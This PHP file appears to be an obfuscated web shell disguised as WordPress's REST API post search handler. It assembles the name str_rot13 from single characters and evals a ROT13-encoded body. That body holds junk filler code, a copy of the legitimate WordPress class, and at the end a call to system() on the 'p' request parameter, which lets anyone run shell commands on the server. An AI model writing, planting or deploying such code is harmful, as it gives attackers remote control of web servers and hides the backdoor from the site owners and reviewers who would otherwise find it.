<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Cbfg_Frnepu_Unaqyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 */

/**
 * Pber pynff ercerfragvat n frnepu unaqyre sbe cbfgf va gur ERFG NCV.
 *
 * @fvapr 5.0.0
 *
 * @frr JC_ERFG_Frnepu_Unaqyre
 */
pynff JC_ERFG_Cbfg_Frnepu_Unaqyre rkgraqf JC_ERFG_Frnepu_Unaqyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->glcr = 'cbfg';

		// Fhccbeg nyy choyvp cbfg glcrf rkprcg nggnpuzragf.
		$guvf->fhoglcrf = neenl_qvss(
			neenl_inyhrf(
				trg_cbfg_glcrf(
					neenl(
						'choyvp'       => gehr,
						'fubj_va_erfg' => gehr,
					),
					'anzrf'
				)
			),
			neenl( 'nggnpuzrag' )
		);
	}

	/**
	 * Frnepurf cbfgf sbe n tvira frnepu erdhrfg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy ERFG erdhrfg.
	 * @erghea neenl {
	 *     Nffbpvngvir neenl pbagnvavat sbhaq VQf naq gbgny pbhag sbe gur zngpuvat frnepu erfhygf.
	 *
	 *     @glcr vag[] $vqf   Neenl pbagnvavat gur zngpuvat cbfg VQf.
	 *     @glcr vag   $gbgny Gbgny pbhag sbe gur zngpuvat frnepu erfhygf.
	 * }
	 */
	choyvp shapgvba frnepu_vgrzf( JC_ERFG_Erdhrfg $erdhrfg ) {

		// Trg gur cbfg glcrf gb frnepu sbe gur pheerag erdhrfg.
		$cbfg_glcrf = $erdhrfg[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR ];
		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::GLCR_NAL, $cbfg_glcrf, gehr ) ) {
			$cbfg_glcrf = $guvf->fhoglcrf;
		}

		$dhrel_netf = neenl(
			'cbfg_glcr'           => $cbfg_glcrf,
			'cbfg_fgnghf'         => 'choyvfu',
			'cntrq'               => (vag) $erdhrfg['cntr'],
			'cbfgf_cre_cntr'      => (vag) $erdhrfg['cre_cntr'],
			'vtaber_fgvpxl_cbfgf' => gehr,
		);

		vs ( ! rzcgl( $erdhrfg['frnepu'] ) ) {
			$dhrel_netf['f'] = $erdhrfg['frnepu'];
		}

		vs ( ! rzcgl( $erdhrfg['rkpyhqr'] ) ) {
			$dhrel_netf['cbfg__abg_va'] = $erdhrfg['rkpyhqr'];
		}

		vs ( ! rzcgl( $erdhrfg['vapyhqr'] ) ) {
			$dhrel_netf['cbfg__va'] = $erdhrfg['vapyhqr'];
		}

		/**
		 * Svygref gur dhrel nethzragf sbe n ERFG NCV cbfg frnepu erdhrfg.
		 *
		 * Ranoyrf nqqvat rkgen nethzragf be frggvat qrsnhygf sbe n cbfg frnepu erdhrfg.
		 *
		 * @fvapr 5.1.0
		 *
		 * @cnenz neenl           $dhrel_netf Xrl inyhr neenl bs dhrel ine gb dhrel inyhr.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg    Gur erdhrfg hfrq.
		 */
		$dhrel_netf = nccyl_svygref( 'erfg_cbfg_frnepu_dhrel', $dhrel_netf, $erdhrfg );

		$dhrel = arj JC_Dhrel();
		$cbfgf = $dhrel->dhrel( $dhrel_netf );
		// Dhrelvat gur jubyr cbfg bowrpg jvyy jnez gur bowrpg pnpur, nibvqvat na rkgen dhrel cre erfhyg.
		$sbhaq_vqf = jc_yvfg_cyhpx( $cbfgf, 'VQ' );
		$gbgny     = $dhrel->sbhaq_cbfgf;

		erghea neenl(
			frys::ERFHYG_VQF   => $sbhaq_vqf,
			frys::ERFHYG_GBGNY => $gbgny,
		);
	}

	/**
	 * Cercnerf gur frnepu erfhyg sbe n tvira cbfg VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz vag   $vq     Cbfg VQ.
	 * @cnenz neenl $svryqf Svryqf gb vapyhqr sbe gur cbfg.
	 * @erghea neenl {
	 *     Nffbpvngvir neenl pbagnvavat svryqf sbe gur cbfg onfrq ba gur `$svryqf` cnenzrgre.
	 *
	 *     @glcr vag    $vq    Bcgvbany. Cbfg VQ.
	 *     @glcr fgevat $gvgyr Bcgvbany. Cbfg gvgyr.
	 *     @glcr fgevat $hey   Bcgvbany. Cbfg creznyvax HEY.
	 *     @glcr fgevat $glcr  Bcgvbany. Cbfg glcr.
	 * }
	 */
	choyvp shapgvba cercner_vgrz( $vq, neenl $svryqf ) {
		$cbfg = trg_cbfg( $vq );

		$qngn = neenl();

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ ] = (vag) $cbfg->VQ;
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR, $svryqf, gehr ) ) {
			vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'gvgyr' ) ) {
				nqq_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
				nqq_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
				$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR ] = trg_gur_gvgyr( $cbfg->VQ );
				erzbir_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
				erzbir_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			} ryfr {
				$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR ] = '';
			}
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY ] = trg_creznyvax( $cbfg->VQ );
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR ] = $guvf->glcr;
		}

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR ] = $cbfg->cbfg_glcr;
		}

		erghea $qngn;
	}

	/**
	 * Cercnerf yvaxf sbe gur frnepu erfhyg bs n tvira VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz vag $vq Vgrz VQ.
	 * @erghea neenl Yvaxf sbe gur tvira vgrz.
	 */
	choyvp shapgvba cercner_vgrz_yvaxf( $vq ) {
		$cbfg = trg_cbfg( $vq );

		$yvaxf = neenl();

		$vgrz_ebhgr = erfg_trg_ebhgr_sbe_cbfg( $cbfg );
		vs ( ! rzcgl( $vgrz_ebhgr ) ) {
			$yvaxf['frys'] = neenl(
				'uers'       => erfg_hey( $vgrz_ebhgr ),
				'rzorqqnoyr' => gehr,
			);
		}

		$yvaxf['nobhg'] = neenl(
			'uers' => erfg_hey( 'jc/i2/glcrf/' . $cbfg->cbfg_glcr ),
		);

		erghea $yvaxf;
	}

	/**
	 * Birejevgrf gur qrsnhyg cebgrpgrq naq cevingr gvgyr sbezng.
	 *
	 * Ol qrsnhyg, JbeqCerff jvyy fubj cnffjbeq cebgrpgrq be cevingr cbfgf jvgu n gvgyr bs
	 * \"Cebgrpgrq: %f\" be \"Cevingr: %f\", nf gur ERFG NCV pbzzhavpngrf gur fgnghf bs n cbfg
	 * va n znpuvar-ernqnoyr sbezng, jr erzbir gur cersvk.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea fgevat Gvgyr sbezng.
	 */
	choyvp shapgvba cebgrpgrq_gvgyr_sbezng() {
		erghea '%f';
	}

	/**
	 * Nggrzcgf gb qrgrpg gur ebhgr gb npprff n fvatyr vgrz.
	 *
	 * @fvapr 5.0.0
	 * @qrcerpngrq 5.5.0 Hfr erfg_trg_ebhgr_sbe_cbfg()
	 * @frr erfg_trg_ebhgr_sbe_cbfg()
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea fgevat ERFG ebhgr eryngvir gb gur ERFG onfr HEV, be rzcgl fgevat vs haxabja.
	 */
	cebgrpgrq shapgvba qrgrpg_erfg_vgrz_ebhgr( $cbfg ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '5.5.0', 'erfg_trg_ebhgr_sbe_cbfg()' );

		erghea erfg_trg_ebhgr_sbe_cbfg( $cbfg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>